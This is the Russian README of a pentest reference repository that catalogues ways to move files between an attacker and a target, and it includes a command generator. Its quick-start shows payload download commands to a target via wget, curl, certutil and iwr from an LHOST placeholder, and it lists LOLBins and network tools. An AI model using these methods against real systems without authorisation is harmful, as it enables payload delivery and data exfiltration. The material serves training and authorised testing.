<p align="center">
  <img src="assets/banner.webp" alt="File Transfer Arsenal" width="820">
</p>

# File Transfer Arsenal

[English](README.md) · [Русский](README_RU.md)

Практический справочник по передаче файлов между атакующим и целью: от обычного HTTP-сервера до DNS/ICMP-туннелей и стеганографии. Для CPTS, OSCP, CTF и авторизованных пентестов.

**TABULA: 299 методов / 25 каналов · 15 разделов · 7 готовых скриптов**

> **Легенда:** 🐧 Linux · 🪟 Windows · 💻 LHOST-сервер

> Материал учебный. Применяйте только в своих лабораториях, на CTF и в рамках разрешённых работ.

## TABULA — онлайн-генератор команд

**Открыть:** **https://5yn7hp0w3r.github.io/file-transfer-arsenal/**

> GitHub Pages сейчас включается. Пока сайт не активен, используйте локальный предпросмотр ниже.

TABULA превращает справочник в рабочую табличку команд под конкретную передачу:

1. выберите сценарий — доставить, вытащить или оба;
2. выберите ОС цели;
3. выберите канал — HTTP/HTTPS, SMB, FTP, SSH, WebDAV, Netcat/Ncat/Socat, RDP, WinRM, DNS, ICMP, TFTP, SMTP, туннели, encoding, encryption или steganography;
4. укажите LHOST/LPORT и дополнительные параметры.

Генератор оставляет только подходящие методы, группирует их по семействам и показывает команды для LHOST/RHOST, пайплайны install/prepare/start, кнопки копирования, проверку hash и cleanup. Он также предупреждает про специальные payload (`.ps1`, `.hta`, `.sct`), изменения реестра, проблемы mount.cifs, отключение TFTP и другие ловушки.

- **Без backend:** все команды генерируются в браузере.
- **Поиск и группы:** фильтрация методов и копирование пары, семейства или всей таблички.
- **Состояние в URL:** несекретные настройки сохраняются в ссылке.
- **Ссылки на источники:** каждый метод ведёт на соответствующий файл docs на GitHub.

Локальный предпросмотр из корня репозитория:

```bash
python3 -m http.server 8000
```

Откройте `http://127.0.0.1:8000/tabula/`.

## Справочник

Дальше идёт сам справочник, на котором построен генератор.

## Как пользоваться

1. Найдите свою ситуацию в таблице ниже.
2. Откройте нужный раздел.
3. Команды помечены `LHOST` / `RHOST` — это подсказывает, на какой машине их выполнять.

## С чего начать

| Ситуация | Раздел |
|---|---|
| Нужно загрузить файл на цель | [01 - Attacker → Target](docs/ru/01-attacker-to-target.md) |
| Нужно вытащить файл с цели | [02 - Target → Attacker](docs/ru/02-target-to-attacker.md) |
| Есть SSH | [06 - SCP / SFTP](docs/ru/06-scp-sftp-rsync.md) |
| Нет `wget` / `curl` | [07 - Netcat](docs/ru/07-netcat.md) · [09 - LOLBins](docs/ru/09-lolbins.md) |
| TCP закрыт, но ходят DNS/ICMP | [12 - DNS / ICMP](docs/ru/12-dns-icmp.md) |
| Нужно передать бинарный файл в виде текста? | [10 - Encoding](docs/ru/10-encoding.md) |
| Нужно зашифровать бинарный файл для передачи? | [11 - Encryption](docs/ru/11-encryption.md) |
| Нужно спрятать файл? | [13 - Steganography](docs/ru/13-stegano.md) |
| Что-то не работает | [14 - Troubleshooting](docs/ru/14-troubleshooting.md) |

## Быстрый старт

80% задач закрывает обычный HTTP-сервер.

```bash
# LHOST: раздаём файлы
python3 -m http.server 80
```

```bash
# RHOST (Linux)
wget http://$LHOST/payload.sh -O /tmp/payload.sh
curl http://$LHOST/payload.sh -o /tmp/payload.sh
```

```cmd
:: RHOST (Windows CMD)
certutil -urlcache -f http://%LHOST%/payload.exe payload.exe
```

```powershell
# RHOST (Windows PowerShell)
iwr "http://${LHOST}/payload.exe" -OutFile payload.exe
```

**Проверить, что есть на Linux-цели:**

```bash
for c in bash curl wget python3 python perl php ruby node nc ncat socat openssl ssh tftp busybox git base64 xxd gzip tar; do command -v "$c" >/dev/null 2>&1 && printf '%s ' "$c"; done; echo
```

> Если список пустой — у вас почти «голый» шелл: смотрите [07 - Netcat](docs/ru/07-netcat.md), [09 - LOLBins](docs/ru/09-lolbins.md) и [10 - Encoding](docs/ru/10-encoding.md). Для `/dev/tcp` нужен именно `bash`.

**Проверить, что есть на Windows-цели (PowerShell):**

```powershell
'certutil','curl.exe','bitsadmin','certreq','certoc','mshta','regsvr32','msiexec','rundll32','expand','extrac32','findstr','makecab','tar','wsl','winget','ftp','tftp','powershell','pwsh' | ForEach-Object { $c=Get-Command $_ -ErrorAction SilentlyContinue; if($c){ '{0} -> {1}' -f $_,$c.Source } }
```

> `MpCmdRun.exe` и `ConfigSecurityPolicy.exe` лежат в папке Defender и не всегда попадают в `PATH` — их пути ищите в [09 - LOLBins](docs/ru/09-lolbins.md). `curl` без `.exe` в PowerShell — это алиас `Invoke-WebRequest`, поэтому проверяем именно `curl.exe`.

## Обозначения и переменные

| Переменная | Что это |
|---|---|
| `LHOST` | IP нашего ПК (атакующий) |
| `RHOST` | IP удалённого ПК (цель) |
| `LHOST_user` | SSH-учётка на нашей машине |
| `RHOST_user` | SSH-учётка на цели |
| `LHOST SHELL` | команда выполняется на нашей машине |
| `RHOST SHELL` | команда выполняется на цели |

```bash
# Linux / bash
export LHOST=192.168.2.5
export RHOST=192.168.10.20
export LHOST_user=user
export RHOST_user=user
```

```cmd
:: Windows CMD
set LHOST=192.168.2.5
set RHOST=192.168.10.20
set LHOST_user=user
set RHOST_user=user
```

```powershell
# Windows PowerShell
$LHOST = "192.168.2.5"
$RHOST = "192.168.10.20"
$LHOST_user = "user"
$RHOST_user = "user"
```

> В PowerShell перед `:порт` в URL используйте `${LHOST}`: `"http://${LHOST}:8000/x"`.

## Структура

```text
file-transfer-arsenal/
├── README_RU.md          # этот файл (русский)
├── README.md             # английская версия
├── docs/ru/              # 15 разделов справочника (русский)
├── docs/en/              # 15 разделов справочника (английский)
├── scripts/              # готовые скрипты
│   ├── upload/serv.py
│   ├── Windows-download-test.ps1
│   ├── Windows-Exfil-tester.ps1
│   └── icmp/icmp_send.py, icmp_recv.py
├── tests/                # unit-тесты (checksum, HTTP-приёмник)
├── tabula/               # статический генератор команд (TABULA)
├── assets/               # графика
├── LICENSE               # MIT (код и командные сниппеты)
└── LICENSE-DOCS          # CC BY 4.0 (документация)
```

## Разделы

| # | Раздел | О чём |
|---|---|---|
| 01 | [Attacker → Target](docs/ru/01-attacker-to-target.md) | Загрузка файлов на цель |
| 02 | [Target → Attacker](docs/ru/02-target-to-attacker.md) | Эксфильтрация с цели |
| 03 | [SMB](docs/ru/03-smb.md) | Двусторонний обмен по SMB |
| 04 | [WebDAV](docs/ru/04-webdav.md) | WebDAV-сервер и монтирование |
| 05 | [FTP](docs/ru/05-ftp.md) | FTP и нестандартные порты |
| 06 | [SCP / SFTP](docs/ru/06-scp-sftp-rsync.md) | Передача поверх SSH |
| 07 | [Netcat](docs/ru/07-netcat.md) | Сырой TCP/UDP |
| 08 | [RDP / WinRM](docs/ru/08-rdp-winrm.md) | RDP-диск, PowerShell Remoting |
| 09 | [LOLBins](docs/ru/09-lolbins.md) | Штатные бинари Windows/Linux |
| 10 | [Encoding](docs/ru/10-encoding.md) | base64, hex, сжатие |
| 11 | [Encryption](docs/ru/11-encryption.md) | openssl, gpg, age, 7z |
| 12 | [DNS / ICMP](docs/ru/12-dns-icmp.md) | dnscat2, iodine, ptunnel-ng, TFTP |
| 13 | [Steganography](docs/ru/13-stegano.md) | Картинки, аудио, текст, ADS |
| 14 | [Troubleshooting](docs/ru/14-troubleshooting.md) | Диагностика и типовые ошибки |
| 15 | [For Blue Team](docs/ru/15-for-blue-team.md) | Детект, телеметрия, IR |

## Скрипты

| Скрипт | Что делает |
|---|---|
| [`upload/serv.py`](scripts/upload/serv.py) | HTTP-приёмник: multipart + raw POST/PUT; настраиваемые порт/каталог, лимит размера, токен, TLS, SHA-256 |
| [`Windows-download-test.ps1`](scripts/Windows-download-test.ps1) | Тестер загрузки в Windows: первый рабочий способ; `-NoLogs` = тихий `Done!`; `-Log` = лог в быстром режиме; `-LOLBINS` = безопасные LOLBins; `-Danger` = только danger; `-All` = полная безопасная матрица + лог |
| [`Windows-Exfil-tester.ps1`](scripts/Windows-Exfil-tester.ps1) | Тестер эксфила из Windows: отправляет файл на Kali-приёмник; первый успех; профиль `-Receiver`; `-All` = матрица + лог |
| [`Linux-download-test.py`](scripts/Linux-download-test.py) | Тестер загрузки в Linux: curl/wget/Python/Perl/PHP/Ruby/Node/bash/busybox/aria2c/axel; `--all` = матрица + лог/CSV |
| [`Linux-exfil-test.py`](scripts/Linux-exfil-test.py) | Тестер эксфила из Linux: uploadserver, serv.py, nginx, WebDAV, FTP, SMB, raw TCP; `--all` = матрица + лог/CSV |
| [`icmp/icmp_send.py`](scripts/icmp/icmp_send.py) | Отправка файла в ICMP echo request |
| [`icmp/icmp_recv.py`](scripts/icmp/icmp_recv.py) | Приём и сборка файла из ICMP |

> **Безопасность:** запускайте тестер только на изолированном авторизованном тестовом хосте. `-Danger` не для production - он меняет lockscreen/реестр и пишет в INetCache/CryptnetUrlCache. Default и `-All` исключают danger-методы.

> Внешний компонент: AES-хелпер `Invoke-AESEncryption.ps1` в репозиторий не входит. См. [11 - Encryption](docs/ru/11-encryption.md#powershell-aes-без-установки) и [gist автора](https://gist.github.com/ddumicz/909d98a0e794a42326d5fcd6d9f2c4ad).

Подробности - в [`scripts/README-RU.md`](scripts/README-RU.md).

## Проверка целостности

```bash
sha256sum secrets.zip
```

```powershell
Get-FileHash secrets.zip -Algorithm SHA256
```

```cmd
certutil -hashfile secrets.zip SHA256
```

## Область применения

Материал предназначен для авторизованных тестов, CTF и изолированных лабораторий. Автор не несёт ответственности за использование вне этих рамок.

## Проверка и ограничения

Большая часть материала проверена автором в лабораторных условиях. При подготовке текста, структуры и отдельных примеров использовался ИИ как помощник — это не заменяет проверку команд на вашей версии Windows/Linux и в вашей инфраструктуре.

Python unit-тесты (checksum и HTTP-приёмник) запускаются без root и scapy: `python3 -m unittest discover -s tests -v`.

Если нашли ошибку, устаревшую команду или неточность — создайте Issue или пришлите Pull Request. Особенно полезны:

- проверка команд на другой версии ОС или инструмента;
- исправления синтаксиса и путей;
- новые рабочие приёмы с подтверждением;
- замечания по детекту для blue team;
- правки ссылок и опечаток.

## Лицензия

- **Код и командные сниппеты** (всё в `scripts/` и команды в документации): MIT — см. [LICENSE](LICENSE).
- **Документация и текст** (README и `docs/`): CC BY 4.0 — см. [LICENSE-DOCS](LICENSE-DOCS).
- **Сторонние компоненты и благодарности**: см. [Авторство](#авторство); они остаются под своими условиями.

При публикации производной версии указывайте автора и ссылку на оригинальный репозиторий. Для документации достаточно атрибуции из `LICENSE-DOCS`; для кода сохраняйте уведомление об авторских правах MIT.

## Авторство

Автор: **synthpowersec**.

### Сторонние проекты и сообщество

- **ddumicz** — автор [`Invoke-AESEncryption.ps1`](https://gist.github.com/ddumicz/909d98a0e794a42326d5fcd6d9f2c4ad). Скрипт не входит в репозиторий; в gist нет явной лицензии, поэтому считайте его сторонним кодом и уточняйте условия у автора перед распространением.
- [**GTFOBins**](https://gtfobins.github.io/) — подборка Unix-бинарей для обхода локальных ограничений в неправильно настроенных системах. Исходники: <https://github.com/GTFOBins/GTFOBins.github.io>.
- [**LOLBAS**](https://lolbas-project.github.io/) — проект Living Off The Land Binaries, Scripts and Libraries для Windows. Исходники: <https://github.com/LOLBAS-Project/LOLBAS>.

Огромное спасибо мейнтейнерам и контрибьюторам этих проектов, а также всем, кто сообщает об ошибках, делится техниками, пишет детекты и вносит вклад в открытые security-проекты — вы делаете сообщество и системы, которые мы защищаем, безопаснее. ❤️

## Поддержать проект

Если материал оказался полезен: [Boosty](https://boosty.to/synthpowersec).
